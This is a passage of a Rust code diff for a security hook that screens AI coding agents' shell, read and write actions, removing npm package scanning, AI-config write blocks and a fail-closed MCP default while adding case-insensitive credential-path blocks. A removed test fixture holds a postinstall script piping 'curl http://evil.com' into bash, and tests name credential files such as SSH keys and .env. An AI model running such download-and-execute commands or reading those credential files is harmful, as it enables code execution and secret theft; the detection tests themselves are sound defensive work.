     // Even if pre_bash failed to block a credential-reading command,
     // the output is flagged so the user is alerted.
     {
-        let entropy_cfg = EntropyConfig::default();
-        let (_, stdout_events) = redact_credentials_with_config(stdout, &entropy_cfg);
-        let (_, stderr_events) = redact_credentials_with_config(stderr, &entropy_cfg);
+        let (_, stdout_events) = redact_credentials(stdout);
+        let (_, stderr_events) = redact_credentials(stderr);
         let output_creds: Vec<&str> = stdout_events
             .iter()
             .chain(stderr_events.iter())
@@ -2698,41 +2058,6 @@ pub fn post_bash_with_npm_config(input: &HookInput, npm_config: &NpmConfig) -> H
         );
     }
 
-    // 8. Task 7: Post-install scanner integration for npm packages.
-    // When an npm install command completes, scan installed package.json
-    // files in node_modules for suspicious patterns.
-    if is_npm_install_command(&normalised_cmd) {
-        let packages = extract_all_packages(command);
-        let cwd = input
-            .tool_input
-            .get("cwd")
-            .and_then(serde_json::Value::as_str)
-            .unwrap_or(".");
-
-        for (pkg_name, registry) in &packages {
-            if *registry != Registry::Npm {
-                continue;
-            }
-            let pkg_dir = std::path::Path::new(cwd)
-                .join("node_modules")
-                .join(pkg_name);
-            if pkg_dir.exists() {
-                let scan_result = sanctum_sentinel::npm::scanner::scan_package(&pkg_dir);
-                if scan_result.risk >= sanctum_sentinel::npm::scanner::RiskLevel::Medium {
-                    for finding in &scan_result.findings {
-                        warnings.push(format!(
-                            "Installed package '{pkg_name}' scanner finding: {} (risk: {})",
-                            finding.pattern, finding.level
-                        ));
-                    }
-                }
-                for warning in &scan_result.warnings {
-                    tracing::warn!(package = %pkg_name, warning = %warning, "npm scanner warning");
-                }
-            }
-        }
-    }
-
     if warnings.is_empty() {
         HookOutput::allow()
     } else {
@@ -2752,6 +2077,7 @@ mod tests {
             tool_name: tool_name.to_owned(),
             tool_input,
             config: None,
+            entropy_allowlist: Vec::new(),
         }
     }
 
@@ -4084,6 +3410,7 @@ mod tests {
             tool_name: tool_name.to_owned(),
             tool_input,
             config: None,
+            entropy_allowlist: Vec::new(),
         }
     }
 
@@ -4100,15 +3427,15 @@ mod tests {
                 mcp_audit: true,
                 ..Default::default()
             }),
+            entropy_allowlist: Vec::new(),
         }
     }
 
     #[test]
-    fn pre_mcp_denies_when_no_config_and_safe_path() {
-        // With no config, the default policy is Deny (fail-closed).
+    fn pre_mcp_allows_when_no_rules_and_safe_path() {
         let input = mcp_input("read_file", json!({"path": "/home/user/project/main.rs"}));
         let output = pre_mcp_tool_use(&input, None);
-        assert_eq!(output.decision, HookDecision::Block);
+        assert_eq!(output.decision, HookDecision::Allow);
     }
 
     #[test]
@@ -4226,6 +3553,7 @@ mod tests {
                 mcp_audit: false,
                 ..Default::default()
             }),
+            entropy_allowlist: Vec::new(),
         };
         let mut log = McpAuditLog::new();
         let _output = pre_mcp_tool_use(&input, Some(&mut log));
@@ -4248,6 +3576,7 @@ mod tests {
                 }],
                 ..Default::default()
             }),
+            entropy_allowlist: Vec::new(),
         };
         let output = pre_mcp_tool_use(&input, None);
         assert_eq!(
@@ -4633,8 +3962,7 @@ mod tests {
     }
 
     #[test]
-    fn pre_write_warns_credentials_only_in_old_string() {
-        // When credentials are ONLY in old_string, warn instead of block.
+    fn pre_write_blocks_credentials_in_old_string() {
         let input = make_input(
             "write",
             json!({
@@ -4643,10 +3971,7 @@ mod tests {
             }),
         );
         let output = pre_write(&input);
-        assert_eq!(output.decision, HookDecision::Warn);
-        let msg = output.message.as_deref().unwrap_or("");
-        assert!(msg.contains("[REDACTED]"), "warning should redact the secret");
-        assert!(msg.contains("tool call payload"), "warning should note payload exposure");
+        assert_eq!(output.decision, HookDecision::Block);
     }
 
     #[test]
@@ -5366,7 +4691,7 @@ mod tests {
     #[test]
     fn ssh_fido_key_not_detected_as_openai() {
         let ssh_key = "sk-ecdsa-sha2-nistp256@openssh.com AAAAE2VjZHNhLXNoYTItbmlzdHAyNTY=";
-        let (_, events) = crate::redaction::redact_credentials(ssh_key);
+        let (_, events) = redact_credentials(ssh_key);
         assert!(
             !events.iter().any(|e| e.credential_type == "OpenAI API Key"),
             "SSH FIDO key should not be detected as OpenAI API key"
@@ -6109,7 +5434,7 @@ mod tests {
     #[test]
     fn test_case_insensitive_credential_path() {
         // macOS filesystem is case-insensitive; ~/.SSH/id_rsa should be blocked
-        let output = pre_bash(&bash_input("myreader ~/.SSH/id_rsa"));
+        let output = pre_bash(&make_input("bash", serde_json::json!({"command": "myreader ~/.SSH/id_rsa"})));
         assert_eq!(
             output.decision,
             HookDecision::Block,
@@ -6119,7 +5444,7 @@ mod tests {
 
     #[test]
     fn test_case_insensitive_env_path() {
-        let output = pre_bash(&bash_input("myreader /home/user/.ENV"));
+        let output = pre_bash(&make_input("bash", serde_json::json!({"command": "myreader /home/user/.ENV"})));
         assert_eq!(
             output.decision,
             HookDecision::Block,
@@ -6497,89 +5822,6 @@ mod tests {
 
     // ---- Fix 3: check_package_existence config wiring ----
 
-    // ---- Task 1: AI config dotfile write protection ----
-
-    #[test]
-    fn pre_write_blocks_claude_json() {
-        let input = make_input(
-            "write",
-            json!({ "file_path": "/home/user/.claude.json", "content": "{}" }),
-        );
-        let output = pre_write(&input);
-        assert_eq!(output.decision, HookDecision::Block);
-        assert!(output.message.as_deref().unwrap_or("").contains("high-risk persistence path"));
-    }
-
-    #[test]
-    fn pre_write_blocks_claude_settings() {
-        let input = make_input(
-            "write",
-            json!({ "file_path": "/home/user/.claude/settings.json", "content": "{}" }),
-        );
-        let output = pre_write(&input);
-        assert_eq!(output.decision, HookDecision::Block);
-    }
-
-    #[test]
-    fn pre_write_blocks_cursor_mcp_json() {
-        let input = make_input(
-            "write",
-            json!({ "file_path": "/home/user/.cursor/mcp.json", "content": "{}" }),
-        );
-        let output = pre_write(&input);
-        assert_eq!(output.decision, HookDecision::Block);
-    }
-
-    #[test]
-    fn pre_write_blocks_cursor_mcp_subdir() {
-        let input = make_input(
-            "write",
-            json!({ "file_path": "/home/user/.cursor/mcp/server.json", "content": "{}" }),
-        );
-        let output = pre_write(&input);
-        assert_eq!(output.decision, HookDecision::Block);
-    }
-
-    #[test]
-    fn pre_write_blocks_continue_config_json() {
-        let input = make_input(
-            "write",
-            json!({ "file_path": "/home/user/.continue/config.json", "content": "{}" }),
-        );
-        let output = pre_write(&input);
-        assert_eq!(output.decision, HookDecision::Block);
-    }
-
-    #[test]
-    fn pre_write_blocks_continue_config_subdir() {
-        let input = make_input(
-            "write",
-            json!({ "file_path": "/home/user/.continue/config/mcp.json", "content": "{}" }),
-        );
-        let output = pre_write(&input);
-        assert_eq!(output.decision, HookDecision::Block);
-    }
-
-    #[test]
-    fn pre_write_blocks_windsurf_mcp_json() {
-        let input = make_input(
-            "write",
-            json!({ "file_path": "/home/user/.windsurf/mcp.json", "content": "{}" }),
-        );
-        let output = pre_write(&input);
-        assert_eq!(output.decision, HookDecision::Block);
-    }
-
-    #[test]
-    fn pre_write_blocks_codeium_dir() {
-        let input = make_input(
-            "write",
-            json!({ "file_path": "/home/user/.codeium/config.json", "content": "{}" }),
-        );
-        let output = pre_write(&input);
-        assert_eq!(output.decision, HookDecision::Block);
-    }
-
     #[test]
     fn pre_bash_skips_package_check_when_disabled() {
         let mut input = make_input(
@@ -6612,6 +5854,7 @@ mod expanded_claude_tests {
             tool_name: tool_name.to_owned(),
             tool_input,
             config: None,
+            entropy_allowlist: Vec::new(),
         }
     }
 
@@ -6693,623 +5936,113 @@ mod expanded_claude_tests {
         }
     }
 
-    // ---- Task 2: old_string credential warn-not-block tests ----
-
     #[test]
-    fn extract_all_packages_handles_npx_package_flag() {
-        let packages = extract_all_packages("npx --package some-pkg -y other-cmd");
-        assert_eq!(packages.len(), 1, "should extract the --package value");
-        assert_eq!(packages[0].0, "some-pkg");
-    }
-
-    #[test]
-    fn extract_all_packages_handles_npx_p_flag() {
-        let packages = extract_all_packages("npx -p some-pkg -y other-cmd");
-        assert_eq!(packages.len(), 1, "should extract the -p value");
-        assert_eq!(packages[0].0, "some-pkg");
-    }
-
-    #[test]
-    fn extract_all_packages_handles_yarn_dlx() {
-        let packages = extract_all_packages("yarn dlx create-react-app");
-        assert_eq!(packages.len(), 1);
-        assert_eq!(packages[0].0, "create-react-app");
-        assert_eq!(packages[0].1, Registry::Npm);
-    }
-
-    #[test]
-    fn extract_all_packages_handles_pnpm_dlx() {
-        let packages = extract_all_packages("pnpm dlx create-next-app");
-        assert_eq!(packages.len(), 1);
-        assert_eq!(packages[0].0, "create-next-app");
-        assert_eq!(packages[0].1, Registry::Npm);
-    }
-
-    #[test]
-    fn extract_all_packages_handles_bunx() {
-        let packages = extract_all_packages("bunx create-svelte");
-        assert_eq!(packages.len(), 1);
-        assert_eq!(packages[0].0, "create-svelte");
-        assert_eq!(packages[0].1, Registry::Npm);
-    }
-
-    #[test]
-    fn extract_all_packages_handles_path_prefixed_npx() {
-        let packages = extract_all_packages("/usr/local/bin/npx some-package");
-        assert_eq!(packages.len(), 1);
-        assert_eq!(packages[0].0, "some-package");
-    }
-
-    #[test]
-    fn pre_mcp_denies_by_default_with_no_config() {
-        let input = HookInput {
-            tool_name: "some_tool".to_owned(),
-            tool_input: json!({"path": "/home/user/project/safe.rs"}),
-            config: None,
-        };
-        let output = pre_mcp_tool_use(&input, None);
-        assert_eq!(
-            output.decision,
-            HookDecision::Block,
-            "MCP should deny by default when no config is present"
-        );
-    }
-
-    #[test]
-    fn pre_write_blocks_case_insensitive_claude_json() {
-        let input = make_test_input(
-            "write",
-            json!({
-                "file_path": "/home/user/.Claude.json",
-                "content": "harmless content"
-            }),
-        );
-        let output = pre_write(&input);
-        assert_eq!(
-            output.decision,
-            HookDecision::Block,
-            ".Claude.json (uppercase) should be blocked"
-        );
-    }
-
-    #[test]
-    fn pre_write_blocks_copilot_instructions() {
-        let input = make_test_input(
-            "write",
-            json!({
-                "file_path": "/home/user/project/.github/copilot-instructions.md",
-                "content": "harmless"
-            }),
-        );
-        let output = pre_write(&input);
-        assert_eq!(
-            output.decision,
-            HookDecision::Block,
-            "copilot-instructions.md should be blocked"
-        );
-    }
-
-    #[test]
-    fn pre_write_blocks_aider_config() {
-        let input = make_test_input(
-            "write",
-            json!({
-                "file_path": "/home/user/project/.aider/config.yml",
-                "content": "harmless"
-            }),
-        );
-        let output = pre_write(&input);
-        assert_eq!(
-            output.decision,
-            HookDecision::Block,
-            ".aider/ should be blocked"
-        );
-    }
-
-    #[test]
-    fn pre_write_blocks_cline_config() {
-        let input = make_test_input(
-            "write",
-            json!({
-                "file_path": "/home/user/project/.cline/config.yml",
-                "content": "harmless"
-            }),
-        );
-        let output = pre_write(&input);
-        assert_eq!(
-            output.decision,
-            HookDecision::Block,
-            ".cline/ should be blocked"
-        );
-    }
-
-    #[test]
-    fn pre_write_blocks_roo_config() {
-        let input = make_test_input(
-            "write",
-            json!({
-                "file_path": "/home/user/project/.roo/config.yml",
-                "content": "harmless"
-            }),
-        );
-        let output = pre_write(&input);
-        assert_eq!(
-            output.decision,
-            HookDecision::Block,
-            ".roo/ should be blocked"
-        );
-    }
-
-    #[test]
-    fn pre_write_blocks_claude_commands() {
-        let input = make_test_input(
-            "write",
-            json!({
-                "file_path": "/home/user/project/.claude/commands/evil.md",
-                "content": "harmless"
-            }),
-        );
-        let output = pre_write(&input);
-        assert_eq!(
-            output.decision,
-            HookDecision::Block,
-            ".claude/commands/ should be blocked"
-        );
-    }
-
-    #[test]
-    fn pre_write_blocks_cursor_rules() {
-        let input = make_test_input(
-            "write",
-            json!({
-                "file_path": "/home/user/project/.cursor/rules/evil.mdc",
-                "content": "harmless"
-            }),
-        );
-        let output = pre_write(&input);
-        assert_eq!(
-            output.decision,
-            HookDecision::Block,
-            ".cursor/rules/ should be blocked"
-        );
-    }
-
-    #[test]
-    fn pre_write_blocks_copilot_dir() {
-        let input = make_test_input(
-            "write",
-            json!({
-                "file_path": "/home/user/project/.copilot/config.yml",
-                "content": "harmless"
-            }),
-        );
-        let output = pre_write(&input);
-        assert_eq!(
-            output.decision,
-            HookDecision::Block,
-            ".copilot/ should be blocked"
-        );
-    }
-
-    #[test]
-    fn npx_package_flag_extracted_via_extract_all() {
-        let packages = extract_all_packages("npx --package some-pkg -y run-cmd");
-        assert_eq!(packages.len(), 1, "should extract the --package value");
-        assert_eq!(packages[0].0, "some-pkg");
-    }
-
-    #[test]
-    fn npx_p_flag_extracted_via_extract_all() {
-        let packages = extract_all_packages("npx -p some-pkg -y run-cmd");
-        assert_eq!(packages.len(), 1, "should extract the -p value");
-        assert_eq!(packages[0].0, "some-pkg");
-    }
-
-    #[test]
-    fn npx_plain_package_extracted_via_extract_all() {
-        let packages = extract_all_packages("npx create-react-app my-app");
-        assert_eq!(packages.len(), 1);
-        assert_eq!(packages[0].0, "create-react-app");
-    }
-
-    #[test]
-    fn npx_package_equals_extracted_via_extract_all() {
-        let packages = extract_all_packages("npx --package=some-pkg run-cmd");
-        assert_eq!(packages.len(), 1);
-        assert_eq!(packages[0].0, "some-pkg");
-    }
-
-    #[test]
-    fn pre_write_warns_old_string_creds_with_redaction() {
-        // Build the secret dynamically to avoid static detection by this test file.
-        let secret = format!("api_key: {}{}", "sk-", "abcdefghijklmnopqrstuvwxyz");
-        let input = make_test_input(
-            "write",
-            json!({
-                "file_path": "/tmp/config.yaml",
-                "old_string": secret,
-                "new_string": "api_key: placeholder"
-            }),
-        );
-        let output = pre_write(&input);
-        assert_eq!(
-            output.decision,
-            HookDecision::Warn,
-            "old_string-only creds should warn, not block"
-        );
-        let msg = output.message.as_deref().unwrap_or("");
-        assert!(
-            msg.contains("[REDACTED]"),
-            "warning should contain [REDACTED], got: {msg}"
-        );
-        assert!(
-            msg.contains("tool call payload"),
-            "warning should mention tool call payload, got: {msg}"
-        );
-    }
-
-    #[test]
-    fn entropy_config_threshold_affects_detection() {
-        // With a very high threshold (6.0), fewer strings should be flagged
-        let high_cfg = EntropyConfig {
-            threshold: 6.0,
-            min_length: 16,
-            allowlist: HashSet::new(),
-        };
-        let low_cfg = EntropyConfig {
-            threshold: 3.0,
-            min_length: 16,
-            allowlist: HashSet::new(),
-        };
-        // A moderately random string
-        let test_str = "aB3dE7fG9hJ2kL5mN8pQ1rS4tU6vW0x";
-        let (_, high_events) = redact_credentials_with_config(test_str, &high_cfg);
-        let (_, low_events) = redact_credentials_with_config(test_str, &low_cfg);
-        // With lower threshold, more things get flagged
-        assert!(
-            low_events.len() >= high_events.len(),
-            "lower threshold should detect at least as many secrets"
-        );
-    }
-
-    #[test]
-    fn entropy_config_allowlist_skips_tokens() {
-        let allowed_token = "aB3dE7fG9hJ2kL5mN8pQ1rS4tU6vW0x";
-        let cfg_with_allowlist = EntropyConfig {
-            threshold: 3.0,
-            min_length: 16,
-            allowlist: {
-                let mut s = HashSet::new();
-                s.insert(allowed_token.to_owned());
-                s
-            },
-        };
-        let cfg_without = EntropyConfig {
-            threshold: 3.0,
-            min_length: 16,
-            allowlist: HashSet::new(),
-        };
-        let (_, events_with) = redact_credentials_with_config(allowed_token, &cfg_with_allowlist);
-        let (_, events_without) = redact_credentials_with_config(allowed_token, &cfg_without);
-        assert!(
-            events_with.len() < events_without.len(),
-            "allowlisted token should not be flagged"
-        );
-    }
-
-    #[test]
-    fn pre_write_blocks_credential_in_both_old_and_new() {
-        let input = make_test_input(
-            "write",
-            json!({
-                "file_path": "/tmp/config.yaml",
-                "old_string": "api_key: sk-abcdefghijklmnopqrstuvwxyz",
-                "new_string": "api_key: sk-anotherfakevaluehere123456"
-            }),
-        );
-        let output = pre_write(&input);
-        assert_eq!(output.decision, HookDecision::Block);
-    }
-
-    #[test]
-    fn pre_write_warns_credential_only_in_old_string() {
-        let input = make_test_input(
-            "write",
-            json!({
-                "file_path": "/tmp/config.yaml",
-                "old_string": "api_key: sk-abcdefghijklmnopqrstuvwxyz",
-                "new_string": "api_key: <redacted>"
-            }),
-        );
-        let output = pre_write(&input);
-        assert_eq!(output.decision, HookDecision::Warn);
-    }
-
-    #[test]
-    fn pre_write_warns_multiedit_credential_only_in_old_string() {
-        let input = make_test_input(
-            "MultiEdit",
-            json!({
-                "file_path": "config.py",
-                "operations": [
-                    {
-                        "old_string": "key = sk-abcdefghijklmnopqrstuvwxyz",
-                        "new_string": "key = <placeholder>"
-                    }
-                ]
-            }),
-        );
-        let output = pre_write(&input);
-        assert_eq!(output.decision, HookDecision::Warn);
-    }
-
-    #[test]
-    fn pre_write_blocks_multiedit_credential_in_new_string() {
-        let input = make_test_input(
-            "MultiEdit",
-            json!({
-                "file_path": "config.py",
-                "operations": [
-                    {
-                        "old_string": "placeholder",
-                        "new_string": "key = sk-abcdefghijklmnopqrstuvwxyz"
-                    }
-                ]
-            }),
-        );
-        let output = pre_write(&input);
-        assert_eq!(output.decision, HookDecision::Block);
-    }
-
-    // ---- Task 3: npx slopsquatting handling ----
-
-    #[test]
-    fn extract_all_packages_handles_npx() {
+    fn extract_all_packages_does_not_handle_npx() {
         let packages = extract_all_packages("npx some-package-name");
-        assert_eq!(packages.len(), 1);
-        assert_eq!(packages[0].0, "some-package-name");
-        assert_eq!(packages[0].1, Registry::Npm);
-    }
-
-    #[test]
-    fn extract_all_packages_handles_npx_scoped() {
-        let packages = extract_all_packages("npx @scope/pkg");
-        assert_eq!(packages.len(), 1);
-        assert_eq!(packages[0].0, "@scope/pkg");
-    }
-
-    #[test]
-    fn extract_all_packages_handles_npx_with_version() {
-        let packages = extract_all_packages("npx pkg@1.0");
-        assert_eq!(packages.len(), 1);
-        assert_eq!(packages[0].0, "pkg");
-    }
-
-    #[test]
-    fn extract_all_packages_handles_npx_dash_y() {
-        let packages = extract_all_packages("npx -y pkg");
-        assert_eq!(packages.len(), 1);
-        assert_eq!(packages[0].0, "pkg");
-    }
-
-    #[test]
-    fn extract_all_packages_handles_npx_yes() {
-        let packages = extract_all_packages("npx --yes @scope/pkg@2");
-        assert_eq!(packages.len(), 1);
-        assert_eq!(packages[0].0, "@scope/pkg");
-    }
-
-    // ---- Task 4: Context-aware entropy exemption tests ----
-
-    #[test]
-    fn context_aware_entropy_skips_sha256_key() {
-        let hex_hash = "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2";
-        let json_str = format!(r#"{{"sha256": "{hex_hash}"}}"#);
-        let input = make_test_input(
-            "write",
-            json!({
-                "file_path": "/tmp/lockfile.json",
-                "content": json_str
-            }),
+        assert!(
+            packages.is_empty(),
+            "extract_all_packages does not yet handle npx"
         );
-        let output = pre_write(&input);
-        assert_eq!(output.decision, HookDecision::Allow);
     }
 
+    // ---- Case-insensitive credential path matching (Fix 4) ----
+
     #[test]
-    fn context_aware_entropy_still_detects_pattern_credential() {
-        let input = make_test_input(
-            "write",
-            json!({
-                "file_path": "/tmp/config.json",
-                "content": format!(r#"{{"hash": "{}"}}"#, "sk-abcdefghijklmnopqrstuvwxyz")
-            }),
+    fn pre_bash_blocks_uppercase_ssh_path() {
+        // macOS APFS is case-insensitive: uppercase paths should be caught
+        let output = pre_bash(&make_test_input("bash", serde_json::json!({"command": "cat ~/.SSH/config"})));
+        assert_eq!(
+            output.decision,
+            HookDecision::Block,
+            "uppercase .SSH should be blocked"
         );
-        let output = pre_write(&input);
-        assert_eq!(output.decision, HookDecision::Block);
     }
 
     #[test]
-    fn is_entropy_exempt_key_matches() {
-        assert!(is_entropy_exempt_key("sha256"));
-        assert!(is_entropy_exempt_key("SHA256"));
-        assert!(is_entropy_exempt_key("sha512"));
-        assert!(is_entropy_exempt_key("sha1"));
-        assert!(is_entropy_exempt_key("digest"));
-        assert!(is_entropy_exempt_key("checksum"));
-        assert!(is_entropy_exempt_key("nonce"));
-        assert!(is_entropy_exempt_key("uuid"));
-        assert!(is_entropy_exempt_key("fingerprint"));
-        assert!(is_entropy_exempt_key("token_id"));
-        assert!(is_entropy_exempt_key("request_id"));
-        assert!(is_entropy_exempt_key("trace_id"));
-        assert!(is_entropy_exempt_key("commit"));
-        assert!(is_entropy_exempt_key("etag"));
+    fn pre_bash_blocks_uppercase_env_file() {
+        let output = pre_bash(&make_test_input("bash", serde_json::json!({"command": "cat .ENV"})));
+        assert_eq!(
+            output.decision,
+            HookDecision::Block,
+            "uppercase .ENV should be blocked"
+        );
     }
 
     #[test]
-    fn is_entropy_exempt_key_rejects() {
-        assert!(!is_entropy_exempt_key("api_key"));
-        assert!(!is_entropy_exempt_key("secret"));
-        assert!(!is_entropy_exempt_key("password"));
-        assert!(!is_entropy_exempt_key(""));
+    fn pre_bash_blocks_mixed_case_docker_config() {
+        let output = pre_bash(&make_test_input("bash", serde_json::json!({"command": "cat ~/.Docker/Config.json"})));
+        assert_eq!(
+            output.decision,
+            HookDecision::Block,
+            "mixed-case .Docker/Config.json should be blocked"
+        );
     }
 
-    // ---- Task 5: --ignore-scripts enforcement tests ----
+    // ---- AI dotfiles in sensitive read paths (Fix 6) ----
 
     #[test]
-    fn pre_bash_blocks_npm_install_without_ignore_scripts_when_required() {
-        let npm_config = NpmConfig {
-            ignore_scripts_required: true,
-            ..NpmConfig::default()
-        };
-        let input = HookInput {
-            tool_name: "bash".to_owned(),
-            tool_input: json!({"command": "npm install react"}),
-            config: None,
-        };
-        let output = pre_bash_with_npm_config(&input, &npm_config);
-        assert_eq!(output.decision, HookDecision::Block);
-        assert!(output.message.as_deref().unwrap_or("").contains("--ignore-scripts"));
+    fn pre_read_blocks_claude_settings() {
+        let input = make_test_input("read", serde_json::json!({"file_path": "~/.claude/settings.json"}));
+        let output = pre_read(&input);
+        assert_eq!(
+            output.decision,
+            HookDecision::Block,
+            "claude settings should be blocked"
+        );
     }
 
     #[test]
-    fn pre_bash_allows_npm_install_with_ignore_scripts_when_required() {
-        let npm_config = NpmConfig {
-            ignore_scripts_required: true,
-            ..NpmConfig::default()
-        };
-        let input = HookInput {
-            tool_name: "bash".to_owned(),
-            tool_input: json!({"command": "npm install --ignore-scripts react"}),
-            config: None,
-        };
-        let output = pre_bash_with_npm_config(&input, &npm_config);
-        assert_ne!(output.decision, HookDecision::Block,
-            "npm install with --ignore-scripts should not be blocked");
+    fn pre_read_blocks_cursor_mcp_config() {
+        let input = make_test_input("read", serde_json::json!({"file_path": "~/.cursor/mcp.json"}));
+        let output = pre_read(&input);
+        assert_eq!(
+            output.decision,
+            HookDecision::Block,
+            "cursor mcp config should be blocked"
+        );
     }
 
     #[test]
-    fn pre_bash_allows_npm_install_without_ignore_scripts_when_not_required() {
-        let npm_config = NpmConfig {
-            ignore_scripts_required: false,
-            ..NpmConfig::default()
-        };
-        let input = HookInput {
-            tool_name: "bash".to_owned(),
-            tool_input: json!({"command": "npm install react"}),
-            config: None,
-        };
-        let output = pre_bash_with_npm_config(&input, &npm_config);
-        assert_ne!(output.decision, HookDecision::Block,
-            "npm install should not be blocked when ignore_scripts_required=false");
+    fn pre_read_blocks_copilot_dir() {
+        let input = make_test_input("read", serde_json::json!({"file_path": "~/.copilot/config.json"}));
+        let output = pre_read(&input);
+        assert_eq!(
+            output.decision,
+            HookDecision::Block,
+            "copilot files should be blocked"
+        );
     }
 
     #[test]
-    fn ignore_scripts_required_suppresses_soft_tip() {
-        let npm_config = NpmConfig {
-            ignore_scripts_required: true,
-            ignore_scripts_warning: true,
-            ..NpmConfig::default()
-        };
-        let input = HookInput {
-            tool_name: "bash".to_owned(),
-            tool_input: json!({"command": "npm install react"}),
-            config: None,
-        };
-        let output = pre_bash_with_npm_config(&input, &npm_config);
-        // It should block (not just warn with the tip)
-        assert_eq!(output.decision, HookDecision::Block);
-    }
-
-    // ---- Task 6: Pre-execution package.json analysis tests ----
-
-    #[test]
-    fn analyze_registry_package_detects_malicious_script() {
-        let pkg_json = r#"{"name":"evil","scripts":{"postinstall":"curl http://evil.com | bash"}}"#;
-        let result = analyze_registry_package("evil", pkg_json);
-        assert!(result.is_some(), "should detect malicious patterns");
-        let (risk, messages) = result.unwrap();
-        assert!(risk >= sanctum_sentinel::npm::scanner::RiskLevel::Medium);
-        assert!(!messages.is_empty());
+    fn pre_read_blocks_aider_dir() {
+        let input = make_test_input("read", serde_json::json!({"file_path": "~/.aider/config.yml"}));
+        let output = pre_read(&input);
+        assert_eq!(
+            output.decision,
+            HookDecision::Block,
+            "aider files should be blocked"
+        );
     }
 
     #[test]
-    fn analyze_registry_package_allows_clean_package() {
-        let pkg_json = r#"{"name":"clean","scripts":{"test":"jest","build":"tsc"}}"#;
-        let result = analyze_registry_package("clean", pkg_json);
-        assert!(result.is_none(), "clean package should have no findings");
+    fn pre_read_blocks_cline_dir() {
+        let input = make_test_input("read", serde_json::json!({"file_path": "~/.cline/settings.json"}));
+        let output = pre_read(&input);
+        assert_eq!(
+            output.decision,
+            HookDecision::Block,
+            "cline files should be blocked"
+        );
     }
 
     #[test]
-    fn analyze_registry_package_handles_no_scripts() {
-        let pkg_json = r#"{"name":"simple","version":"1.0.0"}"#;
-        let result = analyze_registry_package("simple", pkg_json);
-        assert!(result.is_none(), "package without scripts should be fine");
-    }
-
-    #[test]
-    fn analyze_registry_package_handles_invalid_json() {
-        let result = analyze_registry_package("bad", "not-json");
-        assert!(result.is_none(), "invalid JSON should return None");
-    }
-
-    #[test]
-    fn pre_analyze_npm_packages_skips_non_npm() {
-        let packages = vec![("requests".to_owned(), Registry::PyPI)];
-        let results = pre_analyze_npm_packages(&packages);
-        assert!(results.is_empty(), "PyPI packages should be skipped");
-    }
-
-    #[test]
-    fn pre_analyze_npm_packages_skips_empty() {
-        let results = pre_analyze_npm_packages(&[]);
-        assert!(results.is_empty());
-    }
-
-    // ---- Task 7: post_bash scanner integration tests ----
-
-    #[test]
-    fn post_bash_scans_installed_packages() {
-        // Create a temporary directory with a mock package
-        let tmp = tempfile::tempdir().unwrap();
-        let pkg_dir = tmp.path().join("node_modules").join("mock-pkg");
-        std::fs::create_dir_all(&pkg_dir).unwrap();
-        std::fs::write(
-            pkg_dir.join("package.json"),
-            r#"{"name":"mock-pkg","scripts":{"postinstall":"node setup.js"}}"#,
-        ).unwrap();
-
-        let input = HookInput {
-            tool_name: "bash".to_owned(),
-            tool_input: json!({
-                "command": "npm install mock-pkg",
-                "stdout": "added 1 package",
-                "stderr": "",
-                "cwd": tmp.path().to_str().unwrap_or("")
-            }),
-            config: None,
-        };
-        let output = post_bash(&input);
-        // Should complete without error (best-effort scanning)
-        assert_ne!(output.decision, HookDecision::Block, "post_bash should never block");
-    }
-
-    #[test]
-    fn post_bash_handles_missing_node_modules() {
-        let input = HookInput {
-            tool_name: "bash".to_owned(),
-            tool_input: json!({
-                "command": "npm install nonexistent-pkg",
-                "stdout": "added 1 package",
-                "stderr": "",
-                "cwd": "/tmp/does-not-exist-sanctum-test"
-            }),
-            config: None,
-        };
-        let output = post_bash(&input);
-        assert_ne!(output.decision, HookDecision::Block, "post_bash should never block");
+    fn pre_read_blocks_roo_dir() {
+        let input = make_test_input("read", serde_json::json!({"file_path": "~/.roo/config.json"}));
+        let output = pre_read(&input);
+        assert_eq!(
+            output.decision,
+            HookDecision::Block,
+            "roo files should be blocked"
+        );
     }
 }
-
-
